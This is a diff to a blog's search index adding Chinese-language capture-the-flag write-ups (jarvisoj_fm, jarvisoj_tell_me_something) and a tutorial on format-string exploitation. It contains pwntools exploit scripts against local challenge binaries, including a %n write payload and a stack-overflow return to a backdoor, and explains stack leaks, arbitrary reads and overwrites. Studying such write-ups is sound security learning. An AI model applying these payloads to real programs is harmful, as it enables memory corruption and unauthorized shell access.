@@ -7272,6 +7272,35 @@
 <p>函数内容很短，并且因为没有开保护机制，可以考虑直接在栈上写shellcode ，那么问题就是怎么得到栈上的地址</p>
 <p>可以在执行到要ret的时候将返回地址写成<code>mov ecx,esp</code>这个指令的地址，这样直接再执行一遍write</p>
 <p>还没完全弄明白，等等继续</p>
+<h2 id="jarvisoj-fm"><a href="#jarvisoj-fm" class="headerlink" title="jarvisoj_fm"></a>jarvisoj_fm</h2><p>首先检查安全机制</p>
+<p><img src="image-20201201170232547.png" alt="image-20201201170232547"></p>
+<p>用IDA打开</p>
+<p><img src="image-20201201170344974.png" alt="image-20201201170344974"></p>
+<p>main函数部分其实并不存在溢出</p>
+<p>看这个题目的名字，也知道是个格式化字符串，任务就是通过这个printf，把x赋值从3变成4</p>
+<p>这样就可以调起来shell</p>
+<p>首先执行输入<code>%08x</code>这样的形式查看栈上的值</p>
+<p>可以看到输出的几个值分别是<code>printf(buf)</code>中<code>buf</code>的地址、<code>read</code>从右到左的参数</p>
+<p><img src="image-20201201200228420.png" alt="image-20201201200228420"></p>
+<p>通过<code>%p</code>确定了字符串本身的相对偏移</p>
+<p>格式化字符串本身的偏移是11，想要写入的值是4，所以%n的位置应该在四个a后面</p>
+<p>之后<code>aaaa</code>是第11个参数，<code>%14$</code>是第十二个参数，<code>naaa</code>是第十三个参数；</p>
+<p>最后加上的x地址是第14个参数，因此这里<code>%k$n</code>的k填写的是14</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./fm&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload=<span class="string">&#x27;aaaa%14$naaa&#x27;</span>+p32(x)</span><br><span class="line">io.send(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
+
+
+<h2 id="jarvisoj-tell-me-something"><a href="#jarvisoj-tell-me-something" class="headerlink" title="jarvisoj_tell_me_something"></a>jarvisoj_tell_me_something</h2><p>检测安全机制</p>
+<p><img src="image-20201201212323957.png" alt="image-20201201212323957"></p>
+<p>存在后门函数</p>
+<p><img src="image-20201201212554219.png" alt="image-20201201212554219"></p>
+<p>main函数里存在溢出</p>
+<p><img src="image-20201201212627272.png" alt="image-20201201212627272"></p>
+<p>read读了0x100，但是距离rbp只有0x88</p>
+<p>直接返回到good_game</p>
+<p>这里感觉很奇怪，长度0x88可以返回，但是不知道为什么不+8这个rbp的长度</p>
+<figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">from</span> pwn <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">io = process(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line">elf = ELF(<span class="string">&#x27;./guestbook&#x27;</span>)</span><br><span class="line"></span><br><span class="line">payload = bytes(<span class="string">&#x27;a&#x27;</span>*<span class="number">0x88</span>,<span class="string">&#x27;ascii&#x27;</span>) + p64(elf.sym[<span class="string">&#x27;good_game&#x27;</span>])</span><br><span class="line">io.sendline(payload)</span><br><span class="line"></span><br><span class="line">io.interactive()</span><br></pre></td></tr></table></figure>
+
 ]]></content>
       <categories>
         <category>buuctf</category>
@@ -7385,5 +7414,58 @@
       <categories>
         <category>Paper</category>
       </categories>
+  </entry>
+  <entry>
+    <title>FormatString-Pwn</title>
+    <url>/2020/12/01/FormatString-Pwn/</url>
+    <content><![CDATA[<p>学到的格式化字符串利用方式</p>
+<a id="more"></a>
+
+<h2 id="格式化字符串"><a href="#格式化字符串" class="headerlink" title="格式化字符串"></a>格式化字符串</h2><p>格式化字符串漏洞出现的根本原因在于将可控的变量当作字符串输出；</p>
+<p>例如</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line"><span class="built_in">printf</span>(buf);</span><br></pre></td></tr></table></figure>
+
+<p>这样buf内容可控</p>
+<p>设置为<code>%p%p%p%p</code>就可以读到栈上的内容</p>
+<h2 id="泄漏内存"><a href="#泄漏内存" class="headerlink" title="泄漏内存"></a>泄漏内存</h2><h3 id="泄漏栈内存"><a href="#泄漏栈内存" class="headerlink" title="泄漏栈内存"></a>泄漏栈内存</h3><p>一般有几个原则</p>
+<ol>
+<li>利用<code> %x</code> 来获取对应栈的内存，但建议使用 <code>%p</code>，可以不用考虑位数的区别。</li>
+<li>利用 <code>%s</code> 来获取变量所对应地址的内容，只不过有零截断。</li>
+<li>利用 <code>%order$x</code> 来获取指定参数的值，利用 <code>%order$s </code>来获取指定参数对应地址的内容</li>
+</ol>
+<p>需要注意的是</p>
+<p><code>%n$x</code>这样获取到的是第n+1个参数的hex值</p>
+<h3 id="任意地址读"><a href="#任意地址读" class="headerlink" title="任意地址读"></a>任意地址读</h3><p>任意地址读的方法一般是</p>
+<ol>
+<li>确定可控字符串本身的偏移</li>
+<li>在字符串中填一个任意的地址，用<code>%s</code>读这个地址</li>
+</ol>
+<p>确定字符串本身的偏移可以用这个方法</p>
+<figure class="highlight c"><table><tr><td class="code"><pre><span class="line">[tag]%p%p%p%p....</span><br></pre></td></tr></table></figure>
+
+<p>这样看到什么时候出现这个<code>[tag]</code>字符串的ASCII码就可以确定整个字符串的偏移</p>
+<p>如果格式化字符串在栈上，那么我们就需要确定格式化字符串的相对偏移，这是因为在函数调用的时候栈指针至少低于格式化字符串地址 8 字节或者 16 字节，两者并不是紧挨着的</p>
+<h2 id="覆盖内存"><a href="#覆盖内存" class="headerlink" title="覆盖内存"></a>覆盖内存</h2><p>覆盖内存的字符串一般都是</p>
+<figure class="highlight plain"><table><tr><td class="code"><pre><span class="line">...[overwrite addr]...%[overwrite offset]$n</span><br></pre></td></tr></table></figure>
+
+<p>这样的结构</p>
+<h3 id="覆盖栈地址"><a href="#覆盖栈地址" class="headerlink" title="覆盖栈地址"></a>覆盖栈地址</h3><p>格式化字符串往栈上写数据主要靠的是<code>%n</code>，这个格式化字符不输出内容，但是会把已经成功输出的字符个数写入到对应的整形指针参数</p>
+<p>主要任务有三个：</p>
+<ol>
+<li>确定覆盖地址</li>
+<li>确定相对偏移</li>
+<li>进行覆盖</li>
+</ol>
+<p>确定覆盖地址一般需要首先泄漏出变量的地址，可以先通过构造格式化字符串的读来泄漏</p>
+<p>确定相对偏移的方法就是前面任意地址读时用到的，确定出格式化字符串相对函数调用时的栈帧偏移</p>
+<p>最后构造字符串覆盖时，需要注意的是前面填充部分的长度，以及地址本身占位的长度。</p>
+<h3 id="覆盖任意地址"><a href="#覆盖任意地址" class="headerlink" title="覆盖任意地址"></a>覆盖任意地址</h3><h3 id="覆盖小数字"><a href="#覆盖小数字" class="headerlink" title="覆盖小数字"></a>覆盖小数字</h3>]]></content>
+      <categories>
+        <category>Pwn</category>
+      </categories>
+      <tags>
+        <tag>pwn</tag>
+        <tag>linux</tag>
+      </tags>
   </entry>
 </search>
